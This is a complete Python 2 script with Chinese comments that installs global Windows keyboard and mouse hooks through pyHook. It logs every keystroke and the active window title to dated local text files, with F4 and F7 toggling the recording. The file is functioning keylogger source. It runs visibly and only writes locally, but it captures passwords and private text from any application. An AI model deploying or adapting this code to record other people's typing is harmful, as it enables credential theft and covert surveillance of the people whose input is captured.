#!/usr/bin/env python
#encoding=utf-8

import pythoncom
import pyHook
import time, os

def onMouseEvent(event):
	# """监听鼠标事件"""
	# print "MessageName:", event.MessageName
	# print "Message:", event.Message
	# print "Time:", event.Time
	# print "Window:", event.Window
	# print "WindowName:", event.WindowName
	# print "Position:", event.Position
	# print "Wheel:", event.Wheel
	# print "Injected:", event.Injected
	# print "---"
	global preWindowName, switch
	if not os.path.exists(mouseFilepath):
		os.makedirs(mouseFilepath)
	if switch:	
		localTime = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
		datafileName = localTime[:localTime.find(" ")] + ".txt"
		#time  WindowName
		if not os.path.exists(mouseFilepath + datafileName):
			f = open(mouseFilepath + datafileName, "w")
			f.write("localTime				windowname\n")
			f.close()

		if type(event.WindowName) ==  str:	 
			if event.WindowName != preWindowName:
				datafileContent = localTime + ',	' + event.WindowName + '\n'
				f = open(mouseFilepath + datafileName, "a")
				f.write(datafileContent)
				f.close()
				preWindowName = event.WindowName
	#返回True以便将事件传给其他处理程序
	#注意，这儿如果返回False，则鼠标事件将被全部拦截
	#也就是说你的鼠标看起来会将在那儿，似乎失去响应了
	return True

def onKeyboardEvent(event):
	"""监听键盘事件"""
	# print "MessageName:", event.MessageName
	# print "Message:", event.Message
	# print "Time:", event.Time
	# print "Window:", event.Window
	# print "WindowName:", event.WindowName
	# print "Ascii:", event.Ascii, chr(event.Ascii)
	# print "Key:", event.Key
	# print "KeyID:", event.KeyID
	# print "ScanCode:", event.ScanCode
	# print "Extended:", event.Extended
	# print "Injected:", event.Injected
	# print "Alt:", event.Alt
	# print "Transition:", event.Transition
	# print "---"
	global switch
	if not os.path.exists(keyboardFilepath):
		os.makedirs(keyboardFilepath)

	if switch:
		localTime = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
		datafileName = localTime[:localTime.find(" ")] + ".txt"
		#time keyvalue Key WindowName
		if not os.path.exists(keyboardFilepath + datafileName):
			f = open(keyboardFilepath + datafileName, "w")
			f.write("localTime		keyvalue		key		windowname\n")
			f.close()

		if type(event.WindowName) ==  str:
			datafileContent = localTime + ',	' + chr(event.Ascii) + ',	' \
					+ event.Key + ',	' + event.WindowName + '\n'
			f = open(keyboardFilepath + datafileName, "a")
			f.write(datafileContent)
			f.close()

	if event.KeyID == 118:#Key=F7
		switch = False
		print "停止记录..."
	if event.KeyID == 115:#Key=F4
		switch = True
		print "开始记录..."
	# print event.KeyID
	#同鼠标监听事件函数的返回值
	return True

def main():
	"""创建一个'钩子'管理对象"""
	hm = pyHook.HookManager()

	#监听所有键盘事件
	hm.KeyDown = onKeyboardEvent
	#设置键盘'钩子'
	hm.HookKeyboard()

	#监听所有鼠标事件
	hm.MouseAll = onMouseEvent
	#设置鼠标'钩子'
	hm.HookMouse()

	#进入循环，如不手动关闭，程序将一直处于监听状态
	pythoncom.PumpMessages()

if __name__ == '__main__':
	keyboardFilepath = "./log/keyboard/"
	mouseFilepath = "./log/mouse/"
	preWindowName = ''
	switch = True #控制是否开启日志功能
	print "开始监听..."
	print "\n开始记录..."
	main()